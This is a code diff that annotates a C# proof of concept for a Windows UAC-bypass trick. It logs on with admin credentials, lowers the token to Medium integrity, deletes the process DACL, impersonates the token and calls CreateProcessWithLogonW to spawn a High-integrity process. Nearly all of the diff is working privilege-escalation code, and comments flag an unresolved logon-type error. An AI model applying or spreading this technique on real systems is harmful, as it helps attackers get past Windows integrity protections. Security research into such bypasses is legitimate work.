@@ -57,7 +57,7 @@ public class TestCode2
         //      -> Set token IL to Medium
         //      -> Set Everyone FullControl on your current process DACL
         //      -> Impersonate
-        //      -> CreateProcessWithLogon (LOGON_NETCREDENTIALS_ONLY) and specify the admin credentials.
+        //      -> CreateProcessWithLogon (LOGON_NETCREDENTIALS_ONLY) and specify the admin credentials.            // <== KEY -- You have to use netcredentials_only flag or you won't get the high il with this trick ;) 
         //      Enjoy High IL process with Interactive SID 
 
         // -- Call via --
@@ -117,6 +117,10 @@ public class TestCode2
             domainIfSupplied = null;
         }
 
+
+        //
+        // 1. User + PW --> hToken
+        //
         IntPtr hTokenOutput;
         bool did = LogonUserA(userOnly, domainIfSupplied, pwToAdminAccount, (int)logonType, (int)LogonProvider_LogonUser.LOGON32_PROVIDER_DEFAULT, out hTokenOutput);
         if (!did)
@@ -131,22 +135,35 @@ public class TestCode2
         }
         else
         {
+            //
+            // 2. Lower this token Integrity to our integrity (assuming Medium)
+            //
             bool didSetIL = SetTokenIntegrityLevel(hTokenOutput, IntegrityLevel.Medium);
 
-            // Required, otherwise CreateProcessWithLogonW w/ (LOGON_WITH_PROFILE -- different from originally described) = Access Denied (Error: 5)
+            //
+            // 3. Prevent CPWTW from resulting in access denied. Required, otherwise CreateProcessWithLogonW w/ (LOGON_WITH_PROFILE -- different from originally described) = Access Denied (Error: 5)
+            //
             bool didDeleteDACL = GrantEveryoneAccessToProcess(GetCurrentProcessId(), true);             // Kill the DACL
-            //bool didGrantEveryone = GrantEveryoneAccessToProcess(GetCurrentProcessId(), false);       // OR: Everyone : Full Control
+            //bool didGrantEveryone = GrantEveryoneAccessToProcess(GetCurrentProcessId(), false);       // OR alternatively: Everyone : Full Control
 
-            bool didImpersonate = ImpersonateLoggedOnUser(hTokenOutput);                    // <=========== TBD -- Doesn't seem to matter whether we do this or not
+            //
+            // 4. Impersonate this token from LogonUser again
+            //
+            bool didImpersonate = ImpersonateLoggedOnUser(hTokenOutput);                    // <=========== TBD -- Doesn't seem to matter whether we do this or not, same result with LOGON_WITH_PROFILE (but that is different as originally described) 
 
+
+
+            //
+            // 4. Execute! (using the same creds again)
+            //
             PROCESS_INFORMATION pi;
             STARTUPINFO_W si = new STARTUPINFO_W();
             si.cb = Marshal.SizeOf(si);
 
             StopWow64Redirection(true);
 
-            const int LOGON_WITH_PROFILE = 1;                   // <=========================== CHANGE FROM ORIGINAL TECHNIQUE
-            const int LOGON_NETCREDENTIALS_ONLY = 2;            // ERROR_INVALID_LOGON_TYPE
+            const int LOGON_WITH_PROFILE = 1;                   // <=========================== CHANGE FROM ORIGINAL TECHNIQUE -- but apparently will not result in 
+            const int LOGON_NETCREDENTIALS_ONLY = 2;            // [TBD] **ISSUE**   : ERROR_INVALID_LOGON_TYPE occurs. But this is key according to @splinter_code - https://twitter.com/splinter_code/status/1458260294220845056
 
             bool didCreate = CreateProcessWithLogonW(userOnly, domainIfSupplied, pwToAdminAccount, LOGON_NETCREDENTIALS_ONLY,
                 null, fullCmdLine,
